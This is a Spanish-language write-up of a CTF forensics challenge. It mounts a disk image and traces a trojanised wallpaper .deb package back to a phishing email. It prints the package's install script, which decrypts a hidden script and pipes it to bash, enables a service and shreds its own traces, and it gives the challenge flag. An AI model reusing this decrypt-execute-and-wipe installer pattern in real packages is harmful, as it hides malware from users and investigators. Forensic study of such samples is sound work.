### c0r0n4CON CTF 2020

##### Challenge: wall_paint

##### Category: Forensics

##### Points: 250

##### Solves: 69/362

##### Description: We recently detected an intrusion in our networks that led many users to be infected with malware. We need to know how the malware got into the users machines and learn the most out of it. Can you lend a hand?


En este reto obtenemos una imagen la cual tras hacer un "*file*" vemos que es:
```
image: DOS/MBR boot sector
```
Analizándola con "fdisk -lu image" obtenemos:
```
Disco image: 10 GiB, 10737418240 bytes, 20971520 sectores
Unidades: sectores de 1 * 512 = 512 bytes
Tamaño de sector (lógico/físico): 512 bytes / 512 bytes
Tamaño de E/S (mínimo/óptimo): 512 bytes / 512 bytes
Tipo de etiqueta de disco: dos
Identificador del disco: 0xcb310dcc

Dispositivo Inicio Comienzo    Final Sectores Tamaño Id Tipo
image1      *          2048 16779263 16777216     8G 83 Linux
image2             16781310 20969471  4188162     2G  5 Extendida
image5             16781312 20969471  4188160     2G 82 Linux swap / Solaris
```

Así que procedemos a montarla. (El valor 1048576 se obtiene de multiplicar el inicio del sector (2048) por el tamaño de bloque (512)).
```
mount -o loop,ro,offset=1048576 image imagen_montada
```


Analizando los archivos recientes del usuario "corpworker" en "*imagen_montada/home/corpworker/.local/share/recently-used.xbel*" obtenemos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xbel version="1.0"
      xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks"
      xmlns:mime="http://www.freedesktop.org/standards/shared-mime-info"
>
  <bookmark href="file:///home/corpworker/corpwallpaper_1.0.deb" added="2020-04-03T10:16:28Z" modified="2020-04-03T10:16:28Z" visited="2020-04-03T10:16:29.112909Z">
    <info>
      <metadata owner="http://freedesktop.org">
        <mime:mime-type type="application/vnd.debian.binary-package"/>
        <bookmark:applications>
          <bookmark:application name="Thunderbird" exec="&apos;thunderbird %u&apos;" modified="2020-04-03T10:16:28Z" count="2"/>
        </bookmark:applications>
      </metadata>
    </info>
  </bookmark>
</xbel>
```
Donde nos llama la atención el paquete "/home/corpworker/corpwallpaper_1.0.deb" (el cual ya no está en el directorio del usuario).


Haciendo algunas busquedas de "corpwallpaper_1.0.deb" directamente en la imagen, identificamos algunos correos que hablan de una intrusión y uno que facilita un password para "corpwallpaper_1.0.deb".

![for250_1](https://user-images.githubusercontent.com/38633962/79078655-0ed1d900-7d0a-11ea-8431-62ffa557c12e.png)

Asimismo, identificamos el mail con el fichero adjunto:

![for250_2](https://user-images.githubusercontent.com/38633962/79078661-18f3d780-7d0a-11ea-85ea-0c54a89b7d92.png)

Tras extraerlo y abrirlo, vemos que a parte de descargarse una foto de un gatito de Internet e "instalar" un servicio llamado "wallapaper" en "/usr/bin/wallpaper", también ejecuta lo siguiente:
```bash
#!/bin/bash

set -e

systemctl daemon-reload
systemctl enable wallpaper

echo "Installation password required: "
read -s password

openssl aes-256-cbc -a -salt -d -in /tmp/st.sh -pass pass:$password 2>/dev/null | bash
(shred /tmp/st.sh 2>/dev/null 2>/dev/null && rm /tmp/st.sh 2>/dev/null) || true
(shred /home/*/corpwallpaper_1.0.deb 2>/dev/null && rm /home/*/corpwallpaper_1.0.deb 2>/dev/null) || true
(shred /home/*/*/corpwallpaper_1.0.deb 2>/dev/null && rm /home/*/*/corpwallpaper_1.0.deb 2>/dev/null) || true
(shred /tmp/corpwallpaper_1.0.deb 2>/dev/null && rm /tmp/corpwallpaper_1.0.deb 2>/dev/null) || true
```
Que ejecuta "st.sh" y elimina todos los archivos creados/utilizados.

Así que utilizando openssl con el password obtenido anteriormente en el mail y el archivo "st.sh" del paquete .deb, se obtiene el contenido del script y el flag:
```
flag{ur_1nf3ct3d_m4t3!!}
```




